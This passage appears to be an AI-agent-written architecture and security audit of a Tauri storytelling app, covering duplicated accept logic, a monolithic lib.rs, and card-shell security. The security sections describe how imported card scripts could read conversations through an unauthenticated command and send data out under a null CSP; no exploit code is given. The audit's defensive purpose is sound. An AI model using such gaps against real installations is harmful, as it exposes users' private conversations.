- CardShellHost.vue:948 — `createHostHandler(shellVirtualPlugin, invoke, {...})`; `invoke` is the real `@tauri-apps/api/core` import (line 43). CardShellHost.vue:718 injects `generateBridgeScript(shellPluginId, '*')` into the iframe, and plugin-bridge.js:1456-1457/1469 give card JS `window.storyforge.pluginId` + `memory.getRecent(id)`; `_call` (1620-1636) posts `{type:'sf:api:request', pluginId, method, params}` to `parent`. CardShellHost.vue:825-828 routes those straight to `stHostHandler`. Chain is real.
- plugin-bridge.js:185 — `'memory.getRecent': { permission:'ReadMemory', command:'get_conversation', params:(p)=>({id:p.conversationId}) }`. Confirmed; the only gate is `hasAnyPermission` at 1833-1841 (plus `isTrustedSource` and pluginId equality).
- crates/tauri-app/src/lib.rs:6336-6351 — `get_conversation(id, state)` does `Id::from_str(&id)` → `conv_store.get` → returns full `ConversationDisplayDto`. No plugin/permission check. Contrast lib.rs:1794-1909 (`plugin_*` all call `ensure_permission`) and infra-plugin-host/src/lib.rs:227-249 (unregistered id → `PluginError::NotFound`). Accurate.
- lib.rs:2385-2393 `start_writing` — no plugin check. Accurate. Permission enum (infra-plugin-host:33-54) has `ReadCharacters`/`CallLlm`, so the shell's `ReadCharacter`/`Generate` strings genuinely match nothing in API_METHODS — the string mismatch really is what blocks `character.*` and `llm.generate` for shells.
- tauri.conf.json security.csp = null; iframe is `sandbox="allow-scripts"` on a parent-created blob URL, so no CSP inherits — the exfil-channel premise holds. capabilities/default.json only lists core/dialog/fs plugin perms; app commands aren't ACL-gated, so nothing else blocks `get_conversation`.

WHY PARTIAL (kernel true, impact and framing overstated)
1. Not reachable in practice today. `Id` is a UUIDv4 (crates/domain/src/lib.rs:26-32). I grepped for any injection of a conversation id into the shell: `window.currentChatId`/`window.chatId` are read by `_getCurrentChatId` (plugin-bridge.js:1076-1078) but are NEVER set anywhere in frontend/src — CardShellHost injects only `worldbookName` (campaign id) and `selectorVariables` (cardShellDocument.js:30-47) and an opening seed with `mes/swipes`. So card JS has no source for a conversation UUID; `getRecent('')` → `not_found`. The claim concedes the guessing cost but still presents an active read/exfil path. The defect is a missing fail-closed layer, not a live leak.
2. The "self-grants a permission set" framing overstates what the array buys. Four of the six declared permissions are inert: `ReadCharacter`/`Generate` match no API_METHODS key, and `ReadVariables`/`WriteVariables` route to `plugin_get_variable`/`plugin_set_variable`, which call `ensure_permission("card-shell-…")` and fail closed (NotFound) because the id was never installed. `ModifyPrompt` isn't in API_METHODS either. Effectively the array grants exactly one thing: ReadMemory→get_conversation.
3. Mitigation/context the claim missed — and it cuts both ways. The card shell's substantive capabilities do not come from the virtual-plugin array at all; they come from CardShellHost's own `onBridgeMessage` routes (CardShellHost.vue:872-930), which are gated only by a session id the shell itself is given: `campaign_worldbook_get`/`campaign_worldbook_update` (read + enable/disable the active campaign's worldbook, lines 265-281), `shell_variables_set` (read-modify-write campaign variables, 236-252), and `fetch_text`/`fetch_data_url` via host-proxied `card_shell_fetch_url` (host-allowlisted, lib.rs:11036-11052). None of these has any permission check, backend or frontend. So the product already treats card shells as semi-trusted by design; naming `get_conversation` as *the* boundary defect misses that the same component hands the shell campaign worldbook/variable read-write unconditionally.
4. The `start_writing` half is weaker than stated. For genuinely installed plugins the host handler checks the declared permission against the host-held `InstalledPluginDto`, which the iframe cannot forge (`data.pluginId !== plugin.id` returns early). So "no backend verification at all" is defense-in-depth debt, not an exploitable bypass — and against a compromised *main-window* renderer the `plugin_*` wrappers wouldn't help either, since that attacker calls `invoke('get_conversation')` directly.

SEVERITY
I'd put this at medium, not high. It is real design debt with a cheap correct fix (the recommendation is sound: plugin-scoped wrappers + stop fabricating a plugin identity + normalize `ReadCharacter`→`ReadCharacters`, `Generate`→`CallLlm` so a typo stops doing access-control work — that last point is legitimately the sharpest part of the claim). But it doesn't violate any stated project requirement in CLAUDE.md, causes no data loss, and has no exploitation path today because no conversation UUID is obtainable from inside the shell; meanwhile the un-gated host bridge next to it is the larger architectural question. A reviewer who weights "missing authz on an untrusted-content-reachable route" categorically could defend high; under the given definitions the absence of a real risk path makes medium proportionate.

</details>

---

### V7. Accept/commit state machine is fully duplicated between JSON and SQLite backends with observable behavioral divergences

- **维度 / 严重度**：数据模型与状态一致性 / 高
- **对抗核实结论**：确认

**证据**：crates/tauri-app/src/turn_lifecycle.rs:362-528 (`TurnLifecycleService::accept_by_variant`, uses domain `quality_accept_decision`) vs crates/tauri-app/src/sqlite_runtime.rs:296-517 (a second `accept_by_variant` that re-implements the quality gate inline at 380-406 instead of calling `quality_accept_decision`). Divergences: (a) duplicate accept — JSON returns AcceptError (test `duplicate_accept_is_rejected_after_commit`, turn_lifecycle.rs:1097-1126) while SQLite returns Ok via the AlreadyCommitted replay path (sqlite_runtime.rs:346-377); (b) sqlite_runtime.rs:484-496 maps errors by substring: `if e.contains("revision")` → `RevisionConflict { base: campaign_revision_before, current: campaign_revision_before }`, producing the self-contradictory user message "Turn 基于 revision X，但当前 Campaign revision 为 X" and misclassifying SQLite integrity failures like "payload revisions ... differ from indexed revisions" (production.rs:607-614) as stale-turn conflicts; (c) attempt lookup differs — JSON `find_attempt_by_variant` requires `status.is_active()` (domain/turn.rs:399-403), SQLite uses `.iter().rev().find(|a| a.variant_id == ...)` ignoring status (sqlite_runtime.rs:320-325). lib.rs contains 65 `is_sqlite_active()` branch points wiring this split per-command.

**问题与失效模式**：The single most safety-critical code path in the product — the only path allowed to mutate Campaign state — has two independent implementations of quality gating, revision CAS, replay, and terminal-status semantics. Any future change to quality policy, degraded-accept rules, or replay behavior must be made twice, and the compiler cannot detect drift because the sharing boundary is copy-paste rather than a trait. The string-matching error classifier is already a live bug: an integrity Conflict surfaces to the user as "your turn is stale, regenerate" instead of "database corrupted".

**建议**：Extract the backend-agnostic decisions (quality gate via `quality_accept_decision`, duplicate-accept semantics, error taxonomy) into shared domain/app-service code both backends call; replace `e.contains("revision")` with a typed error enum crossing the sqlite_runtime boundary. Decide one duplicate-accept semantic (idempotent Ok is the better one) and apply it to both backends.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked every cited location. (1) Duplication confirmed: turn_lifecycle.rs:362-528 and sqlite_runtime.rs:296-517 independently implement scope checks, quality gate, revision CAS, draft-hash check, and terminal semantics; JSON calls domain quality_accept_decision (turn_lifecycle.rs:398), SQLite re-implements it inline (sqlite_runtime.rs:380-406) — functionally equivalent today, so that half is drift risk, which is how the claim frames it. Dispatch is live: lib.rs:7182-7195 branches on is_sqlite_active(), and grep counts exactly 65 occurrences in lib.rs (matches claim). (2) Divergence (a) confirmed: JSON test duplicate_accept_is_rejected_after_commit (turn_lifecycle.rs:1097-1126) pins second-accept-fails; SQLite returns Ok via the deliberate AlreadyCommitted replay branch (sqlite_runtime.rs:346-377, production.rs:523-549). (3) Divergence (b) confirmed as a live bug: sqlite_runtime.rs:484-496 substring-matches "revision" and constructs RevisionConflict with base==current==campaign_revision_before; Display (turn_lifecycle.rs:213-216) renders the self-contradictory "基于 revision X … 当前 revision 为 X" message; the production.rs:604-615 payload/index integrity Conflict message contains "revisions" (and SqliteError::Conflict's Display preserves it), so DB corruption surfaces as a stale-turn validation error via lib.rs:7199-7205. (4) Divergence (c) confirmed textually: domain find_attempt_by_variant requires status.is_active() (turn.rs:399-403); SQLite's .iter().rev().find ignores status (sqlite_runtime.rs:320-326). Mitigation the claim missed: SqliteProductionRepository::accept_turn is a third authoritative layer that re-validates turn status, attempt status, draft hash, batch fingerprint, and ledger payload hash (production.rs:505-653), so the lax lookup and any runtime-layer drift cannot actually commit an invalid attempt — blast radius is wrong error classification and backend-divergent replies, not silent state corruption. Severity high is proportionate: two independent implementations of the sole Campaign-mutating state machine across live backends, plus a shipping misclassification bug that tells users a corrupted DB is a stale turn. The recommendation (shared decision logic + typed errors across the sqlite_runtime boundary) is apt; note the SQLite Ok-replay is intentional idempotency, so unifying on it, as the claim suggests, is the right direction.

</details>

---

### V8. tauri-app lib.rs is a 21k-line monolith holding all 142 commands plus misplaced business logic

- **维度 / 严重度**：后端分层与依赖 / 高
- **对抗核实结论**：确认（核实者认为严重度评级可商榷）

**证据**：crates/tauri-app/src/lib.rs: 21,060 lines total (inline test mod starts at 12,485), all 142 #[tauri::command] functions (grep count), AppState struct spanning lines 555-600 with ~200 more lines of constructor, start_writing at 2386-2762 (377 lines), postprocess persistence policy at 4684-5130, Meta typed-patch apply at 8550-8862, campaign bundle export/import validation at 11181-12100 (validate_bundle_summary_graph 11313+). Next largest file is campaign_store.rs at 2,456 lines.

**问题与失效模式**：Command plumbing, DTO mapping, context assembly, and genuine domain policy (knowledge normalization, patch application semantics, bundle graph validation) are interleaved in one file spanning ~15 unrelated feature domains. Every parallel workstream touches this file (the current card-shell WIP adds to it again), maximizing merge conflicts; code review of any change means navigating a 12.5k-line non-test surface; and because the policy functions are private to lib.rs or coupled to CampaignStore, harness-real-llm must depend on the full tauri-app crate (harness-real-llm/Cargo.toml: storyforge-tauri-app dep; src/lib.rs:50-52 imports CampaignStore, fill_campaign_runtime_from_store, turn_lifecycle) — pulling the entire Tauri/wry build just to exercise store logic.

**建议**：Split lib.rs mechanically first (no behavior change): one module per command domain (characters, presets, connections, campaigns, world-info, meta, card-shell, export) each owning its commands and DTOs, with lib.rs reduced to AppState + generate_handler registration. Then move backend-independent policy (normalize_knowledge_update_for_postprocess, typed-patch apply, bundle validation) into an app-runtime or app-store crate below tauri-app, which also lets harness-real-llm drop its tauri-app dependency.

<details><summary>核实过程记录（独立验证 agent）</summary>

Checked every cited fact in the working tree. Confirmed: lib.rs is 21,060 lines (test mod at 12,485); all 142 #[tauri::command] fns are in lib.rs (no other file in the crate has any); AppState at 555 with impl 608-874; start_writing 2386-2760 (~375 lines); postprocess persistence policy (persist_postprocess_outcome_to_store 4684, normalize_knowledge_update_for_postprocess 4835); typed-patch apply/validation in lib.rs (meta_accept_typed_patch_in_store 8417, validate_typed_patch_targets 8550); bundle export/import with validate_bundle_summary_graph at 11313; campaign_store.rs (2,456 lines) is the crate's next-largest file; harness-real-llm/Cargo.toml:20 depends on storyforge-tauri-app and imports CampaignStore/fill_campaign_runtime_from_store/turn_store at src/lib.rs:50-52; tauri-app's tauri="2" dep is unconditional so the harness pulls the full Tauri/wry build; the current card-shell WIP adds 45 lines to lib.rs, confirming the every-workstream-touches-it point. Nuances the claim missed: (1) the crate already has 19 extracted sibling modules (production_postprocess.rs 2,285 lines, turn_lifecycle.rs 1,745, etc.), so extraction is an established pattern and the monolith framing applies to lib.rs specifically, not the crate; (2) the harness dependency is a documented deliberate choice ("零行为复制" comment — reuse production assembly logic instead of copying behavior), and DOCS-CODE-AUDIT.md notes the sync fill_campaign_runtime_from_store is intentionally retained as a harness entrypoint; (3) normalize_knowledge_update_for_postprocess and fill_campaign_runtime_from_store are pub crate-root exports, not private — the coupling is at crate granularity, not symbol visibility. Severity: high is disproportionate under the given definitions. No stated project requirement is violated (the only layering hard rule is app-agent must-not-depend-on-tauri-app, which holds; project docs treat lib.rs as the commands' home without flagging it), and there is no security/data-loss exposure — the policy code is tested inline and via the harness. The harm is maintainability friction (merge conflicts, review burden, build weight), and the claim's own recommendation is a no-behavior-change mechanical split: the textbook profile of medium ("real design debt worth a planned fix").

</details>

---

## 三、系统性模式（自 39 条未逐条核实的重要发现与七维评估提炼）

1. **复制而非收敛**：3 个 ~75% 相同的 tool loop（runtime.rs，~420 行）；start_writing/regenerate 复制导演+子代理+编辑阶段（事件发射已漂移：EditorStarted/StateChanged 双发/漏发）；postprocess 持久化策略 store/runtime 双路径；typed-patch preview/apply 双实现；~65 处 `is_sqlite_active()` 散点分支而非端口抽象。每一处都是"改一忘一"的温床，V7 的 Accept 分歧就是这个模式已经兑现的实例。
2. **卡壳工作流在绕过自家机制**：变量袋 `__storyforge_card_shell_variables` 绕过全部一致性机制（无锁读改写整个 JSON blob，仅靠前端 promise 队列串行）；AppV2.vue 累积 ~250 行卡壳业务逻辑且不在任何 composable 里——**App.vue 1462 行单体的历史正在重演，且前端无 eslint 机械防线**；命定卡 CDN 特例（地图 URL、i.ibb.co range-fetch、ultra→standard 静默降级替换）硬编码进通用宿主层，没有"第二张卡来了怎么办"的边界政策——这正是项目自己警告的"增量变成第二个 SillyTavern"的到达路径。
3. **文档系统失去同步**：被指定为权威的 DOCS-CODE-AUDIT.md 断言 14 crate/110 命令（实际 16/142）；"阶段性暂停改代码"声明当天被 5 个 commit 突破且未回写；91 个活跃 md、24 PLAN/22 RESULT 未按既有归档惯例归档。对一个靠 AI agent 执行、把"必读文档"当工作记忆的项目，**这是记忆污染，不是卫生问题**。
4. **Android-first 与投入错位**：INTENT 第一决策是 Android-first，但 Android 停在 ~20% 已三周；近月 ~35 个 commit 全是桌面 WebView2 特化投入（blob URL、高度 hack、30MiB 地图资产逼近移动缓存预算）；V4（fsync）在 Android 目标文件系统上恰恰最现实。
5. **规模债与 Android 目标矛盾**：infra-vector 每次 upsert 全量重写 1024 维 JSON 语料；campaign 集合是跨所有 campaign 共享的整文件重写 Vec，无压缩；21,060 行 lib.rs 是每个特性、每个并行 worktree、每次增量编译都要过的单点。
6. **工作树风险**：3 天未提交的 WIP 中 tracked 文件 import 着 untracked 模块——任何部分提交都是坏构建；一次性 codemod 脚本、卡资产 JSON/zip、266KB 无断言 println "测试"滞留仓库。

---

## 四、建议（按优先级；本轮只记录，未执行）

### P0 — 数据正确性与安全（改动小、收益立竿见影）

1. **修 V1**：regenerate 的 present_chars 从手头已有的 `provenance.plan.subagent_tasks` 派生（或让 regenerate 填 session），加回归测试断言 Campaign 模式重 roll 后 run_postprocess 收到非空 present_chars。
2. **修 V2**：postprocess 目标解析同时查当前 attempt 的 pending_temporary_instances（instance id 已定），或把未解析目标延迟到 accept 时 Mutation 应用阶段归一；**无论哪种，同步修订 CLAUDE.md 的 Phase 6 事实为 A.1 语义**。
3. **修 V3**：开场选择先持久化再 disarm——复用现有 variant edit/switch Tauri 命令写入第一个 conversation 节点，本地重写降级为后端成功后的乐观 UI。
4. **修 V5+V6**：tauri.conf.json 补显式 CSP（`default-src 'self'` 基线 + 收窄的 connect/img/script-src 含 storyforge-cache:/data:/blob:，并实测 WebView2/Android 对 blob iframe 的 CSP 继承）；给 get_conversation 加 `plugin_get_conversation` 包装并过 ensure_permission，API_METHODS 不再指向无鉴权裸命令；卡壳虚拟插件权限收敛为最小集。
5. **修 V4**：atomic_write 对 temp 文件 fsync、Unix（Android）上 rename 后 fsync 父目录；删除直写回退（换重试+硬错误）；campaigns/turns/instances 损坏加载时进入显式恢复流程而非静默空集。

### P1 — 阻止腐化的结构收敛

6. **Accept 语义合一**（V7）：质量门（复用 quality_accept_decision）、重复 accept 语义（建议统一为幂等 Ok）、错误分类（typed enum 替换 `e.contains("revision")`）提取为两后端共享的 service。
7. **lib.rs 机械拆分**（V8）：每命令域一个模块（无行为变更），lib.rs 只剩 AppState + generate_handler 注册；随后把领域策略（postprocess 归一化、typed-patch 应用语义、bundle 图校验）下沉 app-* crate——同时解开 harness-real-llm 被迫链接整个 Tauri 栈的依赖。
8. **tool loop 合一**：三个变体归一，regenerate 复用 start_writing 的阶段函数，消除事件漂移。
9. **卡壳收口**：AppV2 卡壳逻辑抽 `useCardShell` composable；CardShellHost 内联 ~330 行字符串运行时抽出为可测 util；**写一页"卡特例边界政策"**（什么允许硬编码、什么必须走通用路径），在第二张卡到来之前。
10. **变量袋并轨**：`__storyforge_card_shell_variables` 并入正常变量写路径（持锁、campaign-scoped、参与 active-turn 写屏障）。

### P2 — 流程与规模

11. **文档减负**：数字型"事实"（crate 数、命令数）改脚本生成或删除；完成的 PLAN/RESULT 归档；权威文档加"最后核对 commit"字段。
12. **落盘 WIP**：立即提交当前 card-shell WIP（含 6 个 untracked 源/测试文件）；删一次性 codemod 脚本；.worktrees/、卡资产进 .gitignore；处理 266KB println 测试（删或改为真 fixture 断言测试）。
13. **规模债**：向量库改批量/增量写；共享 JSON 集合按 campaign 拆分或加压缩；Android 真机前复测。
14. **需要拍板的方向问题**：Android-first 要么恢复投入（P0 的 fsync 与 CSP 都是它的前置），要么诚实修订 INTENT 为桌面优先——当前宣称与投入互相矛盾，会持续误导排期判断。

---

## 附录 A：七个维度的评估结论（分析 agent 原文）

### 后端分层与依赖

The load-bearing hard rules are genuinely honored in code, not just in docs: app-agent's Cargo.toml (deps at lines 6-16) has no tauri-app or app-pipeline dependency; ToolContext (crates/app-agent/src/tools.rs:120-141) carries no CampaignStore — only `campaign_runtime: Option<Arc<CampaignRuntimeContext>>` plus trait-object infra ports; and CampaignRuntimeContext (crates/domain/src/campaign_runtime.rs:24-33) is a strictly pure, well-tested domain snapshot with zero store/lock/Tauri types (grep for CampaignStore/tauri across app-agent, app-pipeline, domain src returns nothing). The dependency graph is acyclic and layered correctly (domain → infra-* → app-* → tauri-app), app-pipeline's dependency on infra-plugin-host is only the MvuRuntime trait seam (infra-plugin-host/src/mvu_runtime.rs:64) with the WebView implementation correctly living in tauri-app, and harness-real-llm → tauri-app is directionally safe (a leaf test harness above the adapter, no cycle). The turn machinery shows real extraction discipline: turn_lifecycle.rs, turn_coordinator.rs, production_postprocess.rs, and card_shell_cache.rs are coherent modules with services, thin forwarding wrappers instead of duplication, and fail-closed backend guards. However, the composition root has become the architecture's weakest point and contradicts its own layering story: crates/tauri-app/src/lib.rs is 21,060 lines (~12.5k non-test) holding all 142 #[tauri::command] functions across ~15 unrelated domains, a 324-line AppState, plus substantial business policy that belongs in app-* crates — postprocess knowledge normalization/name-collision/presence rules (lib.rs:4684-5130), Meta typed-patch application semantics (lib.rs:8550-8862), and ~900 lines of campaign-bundle graph validation (lib.rs:11181-12100). This misplacement is what forces harness-real-llm to link the whole Tauri stack just to test store logic, and it is compounded by three systemic smells: postprocess persistence policy implemented in parallel for store-backed vs runtime paths (divergence risk between JSON and SQLite semantics), a dual state model (Tauri-managed AppState alongside eight process-global OnceLock store singletons kept for "M0 compatibility"), and backend selection branched at ~65 `is_sqlite_active()` call sites instead of behind a port. The uncommitted card-shell work additionally bakes one specific card's URLs and fallback behavior into the otherwise card-agnostic host cache. Net: the stated hard rules pass cleanly, but the adapter layer has absorbed enough application logic that the crate decomposition is currently more honest on paper than in tauri-app itself.

### 数据模型与状态一致性

The turn-commit core is genuinely well-engineered and mostly honors the project's own rules: Campaign is the single aggregate root with a once-per-commit revision CAS (turn_coordinator.rs), a write-ahead TurnRecord journal with `intended_terminal_status` and conservative startup replay (turn_store.rs, turn_lifecycle.rs), three-state idempotent upserts, per-collection preflight simulation before any durable write, poisoned-lock recovery everywhere, compensating rollback in create_campaign_with_instances, and a textbook fail-closed JSON→SQLite cutover (marker-as-commit-point, temp DB, verify, never touch source). Layering rules hold: CampaignRuntimeContext stays a pure domain snapshot, the coordinator never leaks stores into ToolContext, and scope checks (campaign/conversation/lineage) are enforced on the accept path with good test coverage including crash-simulation tests. However, the same review surfaces three structural problems. First, the whole edifice rests on `atomic_write` in infra-util, which never fsyncs the temp file or directory and falls back to a non-atomic direct write on rename failure — so the journal's "durable before side effects" claim only holds for process crashes, not OS/power crashes, which matters for the stated Android-first direction; corruption then silently degrades to an empty collection. Second, the most safety-critical path (Accept) now exists twice: `TurnLifecycleService::accept_by_variant` (JSON) and `sqlite_runtime::accept_by_variant` + `production.rs::apply_mutation` (SQLite) re-implement the quality gate, replay semantics, and mutation validation with observable divergences (duplicate-accept returns error vs success; instance-referential-integrity for knowledge/tasks enforced only on JSON; error classification by string matching), and the split is wired through ~65 `is_sqlite_active` branches in a 12.5k-line lib.rs rather than a storage trait — while the SQLite authority still cannot serve world info, MVU, Meta typed patch, campaign delete, or variable writes, so neither backend is complete. Third, the current card-shell WIP quietly adds a state channel that bypasses all of this machinery: an untyped JSON blob (`__storyforge_card_shell_variables`) written through an unlocked read-modify-write Tauri command, serialized only by a frontend promise queue. The consistency machinery itself is proportionate for a multi-agent async writer — but it is being duplicated instead of consolidated, and new features are being built around it rather than through it.

### 多 Agent 流水线与运行时

The pipeline/runtime layer is one of the stronger parts of this codebase in its *semantics* and one of the weaker in its *structure*. Genuinely well-designed: operation-owned cancellation (WritingCancelHandle with generation-id compare-and-clear, tauri-app/src/lib.rs:514-552, tested at 18443+) propagates a watch channel through every layer down to the SSE read loop and retry wrapper (infra-llm/src/http_client.rs:359-371, retry.rs:125); subagents are semaphore-queued, index-aligned, panic-isolated via JoinHandle, and individually failure-isolated with an explicit all-failed abort (runtime.rs:768-978, app-pipeline/lib.rs:958-993); postprocess is correctly best-effort with a clean PostProcessSkipped-vs-Failed distinction (lib.rs:1190-1341) and runs in a background task that takes *ownership* of the per-request orchestrator, so pending_temporary_instances/session never become cross-request shared mutable state; the 5-layer JSON fallback machinery is properly deduplicated into llm_parse.rs with good unit tests; hard fail-closed budgets exist for reasoning bytes; and the hard layering rules (no CampaignStore in ToolContext, campaign data as Arc<CampaignRuntimeContext> snapshot) are respected throughout. Against that, the structure fails its own maintainability bar: three ~75%-identical tool loops (~420 lines) and a second full copy of the director+subagent stage inside regenerate (~230 lines) plus a duplicated editor stage have already produced observable behavioral drift (double/missing EditorStarted and StateChanged events between paths), and two real data-completeness defects sit exactly on the seams the project itself flagged as delicate: regenerate's postprocess always runs with empty present_chars because WritingSession is only populated by start_writing, and the A.1 "temps land at accept" redesign silently reintroduced the Phase-6 "temporary instance knowledge is skipped" problem that CLAUDE.md still claims is fixed. MessageLayout's stable-prefix cache discipline is convention plus round-1-only logging, not enforcement, and the single PromptHook seam silently degrades (8s timeout falls back to unmodified messages). Extensibility is mediocre: adding a tool is trivial (closure registry + whitelist), adding a role is moderate (enum + config plumbing), but adding a pipeline stage means hand-editing two divergent scripts and an implicit event contract. Overall: requirement-compliant on layering, cancellation, and failure semantics; non-compliant on "agent outputs structurally validated before persistence" at the Plan boundary; and carrying two concrete data-loss bugs plus a large, already-symptomatic duplication debt.

### 前端架构

The frontend architecture is genuinely better than the monolith it replaced, and several of its self-imposed disciplines hold up under mechanical checking: the design/ layer is pure-presentation in 23 of 24 imports (only vue + sibling components), the adapter layer (useWritingScreenAdapter etc.) cleanly maps stores to props per the CONTRACT.md cards, the composable DI topology is explicitly documented with its initialization-order rationale, the card-shell hard constraints are respected at the frontend boundary (iframe is sandbox="allow-scripts" only so blob: documents get an opaque origin; all remote fetches route through cardShellFetchUrl host mediation; bridge messages are session-scoped with a non-owner guard for multi-instance races), and the pure-util extraction (7 cardShell*.js utils, all with node tests that pass) is exactly the right direction. But the same failure pattern that produced the old 1462-line App.vue is visibly restarting: AppV2.vue (806 lines) has accreted ~250 lines of card-shell business logic (manifest resolution, opening arm/disarm state machine, chat-seed assembly, variable-write scoping heuristics, and a 46-line in-place message-variant rewrite) that lives in none of the composables and is absent from the file's own architecture header, and the composition-root discipline has no lint enforcement whatsoever (frontend has no eslint config), so the one design-layer purity violation and the accretion both slipped in silently. Two findings rise above design debt: the opening-shell scenario selection is applied only to the local Pinia message array and never persisted, so the Campaign conversation store — which the project declares the runtime source of truth — silently disagrees with what the user chose and reverts it on reload/next turn; and useNewCampaignForm is instantiated twice (composition root + component) with asymmetric injections, doubling network fetches and leaving a latent trap where the root instance would skip the manifest refresh. CardShellHost meanwhile is a competent but half-extracted 968-line component whose riskiest logic (~330 lines of stringified iframe runtime: module-graph resolver, CDN preloads with zod content-sniffing, chat seeding) remains untestable inline while its simpler siblings were extracted and tested. Overall: the architecture meets its stated layering requirements today, but only by convention; the card-shell workstream is the first feature to bypass the composable pattern, and without extraction plus mechanical boundary enforcement the composition root will re-monolithize.

### 安全架构

The security architecture is genuinely stronger than the average hobby ST-compatible app in three places, and materially weaker than its own written constraints in one. What is well-designed: the card shell runs in `sandbox="allow-scripts"` with no `allow-same-origin` off a blob URL (`CardShellHost.vue:26-33,190-197`), so it holds an opaque origin and cannot touch the app DOM or reach `window.__TAURI_INTERNALS__`; every host-side bridge callback is campaign-scoped rather than parameter-scoped — `shell_variables_set` writes only `props.campaignId` (`CardShellHost.vue:236-252`), `campaign_worldbook_*` hard-asserts the bound worldbook name (`:258-281`) and `resolveCampaignWorldbookEnabledUpdates` narrows card requests to an `enabled` toggle only (`cardShellWorldbook.js:39-52`), so cross-campaign poisoning is structurally prevented; the local `storyforge-cache` protocol accepts only an opaque `sha256`-derived filename and rejects traversal (`card_shell_cache.rs:195-213,421-428`); redirect hops are each re-validated with a manual `Policy::none()` loop and IP literals rejected, which is a real SSRF control (`:125-131,294-329`); secrets are keyring-backed `SecretRef`s with plaintext migration, never returned to the frontend (`connection_store.rs:83,240-247`; `ConnectionEditDetailDto.has_api_key` at `lib.rs:5736`), the LLM interceptor logs only `req.messages` and not headers (`interceptor.rs:42-43`), the diagnostic bundle summarizes store files instead of dumping them (`lib.rs:6653-6700`), and plugin request headers are always redacted (`pluginPersistence.js:189-207`); prompt-injection blast radius is deliberately narrow because *every* Director/Subagent tool is read-only (`app-agent/src/tools.rs:290-950` — `search_world_info`, `list_characters`, `get_character`, `emit_plan`, `search_vectors`, `get_recent_summary`, `search_chronicle`, `get_chronicle`), so a malicious card cannot drive a tool call into a durable write; no Tauri command accepts a filesystem path (imports take `Vec<u8>`/JSON, `lib.rs:1022,1393,11694`). What does not hold: the workstream plan's own hard constraint — "主应用 **不** 与卡脚本 same-origin；远程资源 **宿主代持**（allowlist + 缓存）" (`docs/workstreams/CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:11`) — is only half enforced. The same-origin half holds; the host-mediation half does not, because `app.security.csp` is `null` (`tauri.conf.json:20-21`) and the fetch proxy is a `window.fetch` monkey-patch (`cardShellFetchProxy.js:55-64`), so card JS reaches the network freely via XHR/`Image`/`sendBeacon`/`<script src>`. The allowlist is therefore a routing convenience, not a boundary — a point sharpened by the fact that six of its ten entries (jsdelivr ×2, raw.githubusercontent, github, gitee, catbox) serve arbitrary attacker-published content anyway. Layered on top, the card shell fabricates a *virtual plugin* with self-granted permissions and routes it through `createHostHandler`, whose permission gate is host-side-only for the two API methods that map to non-plugin Tauri commands — giving imported card HTML a live path to `get_conversation`, which performs no authorization at all. Finally the WIP has let one specific third-party card's CDN quirks become load-bearing constants inside the host security module, which is exactly the "cards are import material, not the product form" inversion the project says it wants to avoid.

### 产品意图符合度与范围纪律

StoryForge's intent documentation is unusually good — INTENT.md states a falsifiable product thesis (Campaign is the runtime truth source, ST cards are material not product form), the card-shell plan encodes real hard constraints, and the code genuinely honors the ones that matter most: CardShellHost.vue loads card scripts in a sandbox="allow-scripts" iframe with an opaque origin (never same-origin with the app), all shell network access is host-mediated through an allowlist+cache (window.fetch is fully proxied to the host), degradations surface visible notices rather than faking success, and the evidence docs repeatedly refuse to record PASS for unverified GUI acceptance ("不能把…写成已完成的真实交互视觉位置验收"). The Campaign closed loop (import → create campaign → write → postprocess write-back → next-turn read) is complete in code (fill_campaign_context_async, persist_postprocess_outcome_async, temporary-instance persistence at lib.rs:3495/4640) with 100-turn endurance evidence; the remaining gaps are exactly the documented ones: gold-card GUI screenshot acceptance and any Android verification at all. The Card Studio feasibility doc correctly names and rejects the "second SillyTavern" trap. However, execution over the last month drifts from the project's own stated priorities in measurable ways: Android-first (INTENT key decision #1) has been stalled at ~20% since 07-06 while ~35 desktop-only commits built an increasingly complete ST runtime surface; card-specific knowledge (Destiny map URLs, i.ibb.co range-fetch quirks, per-card DOM repair scripts, ST chat[0]/swipes seeding) is now compiled into generic host layers with no documented policy for what happens with card #2 — the docs define non-goals (no 99-event set, no plugin market, no 100% equivalence claim) but not an operational boundary that would stop the next card from adding more special cases; a declared code freeze ("阶段性暂停改代码") was overrun by five code commits the same day and ~20 uncommitted WIP files now; the designated authority doc (DOCS-CODE-AUDIT.md) asserts stale facts as verified; and a parallel worktree shipped Card Studio Phase 1 plus explicitly-deferred Phase 2 features in one evening while main's card-shell WIP sat uncommitted. Net judgment: the card shell is still defensibly a compatibility layer for one gold card — the architecture constraints held — but the process gates did not hold, and the per-card hardcoding plus undocumented card-#2 boundary is precisely the mechanism by which the warned-against "second SillyTavern" would arrive incrementally.

### 工程健康与规模上限

StoryForge's engineering health is a study in contrasts: the parts the project wrote rules about are genuinely well-engineered, and the parts the rules don't cover are where it is quietly rotting. The stated hard constraints verifiably hold — app-agent's Cargo.toml depends only on domain/infra crates (no tauri), campaign runtime passes as a pure domain snapshot, all JSON persistence goes through atomic_write_json with .tmp/.corrupt recovery, and the test economy has a deliberately sound split (deterministic suites always-on, real-LLM suites #[ignore]d behind scripts, frontend two-tier node:test + vitest/happy-dom with 42+ util files and 11 component files). The release checklist culture ("不能用理论通过替代", explicit 待真机/部分通过 states) is more honest than most professional teams. But the doc-as-code system that CLAUDE.md makes load-bearing has stopped being paid for: the designated "authority" file DOCS-CODE-AUDIT.md asserts 14 crates/110 commands against a reality of 16/142, ARCHITECTURE-AUDIT.md (required reading #3) is dated 2026-06-17, and 58 workstream files (24 PLAN/22 RESULT) sit unarchived while the active card-shell plan pins a commit 6 commits behind HEAD — for an AI-agent-driven workflow this is not cosmetic, it is corrupted working memory. Scaling posture contradicts the Android-first decision at three points: infra-vector rewrites the entire 1024-dim JSON corpus to disk on every single upsert, campaign collections are whole-file-rewritten Vec<T>s shared across all campaigns with no compaction, and all 142 commands live in a 21,060-line lib.rs (12.5k prod + 8.6k inline tests) compiled as staticlib+cdylib+rlib — the single file that every feature, every parallel worktree agent, and every incremental build must pass through. Finally, the working tree itself is the most acute risk: 3 days of uncommitted card-shell WIP where tracked files import untracked modules (a partial commit ships a broken build), a card-specific Destiny hardcode in the generic shell-cache layer that permanently degrades a resource while telling the user it's temporary, and a 266KB assert-free println test compiled by every workspace test run. For a solo project the verdict is: architecture rules intact, scaling debt acknowledged-but-mispriced for Android, and process hygiene (docs sync, commit discipline) currently below the bar the project set for itself.

---
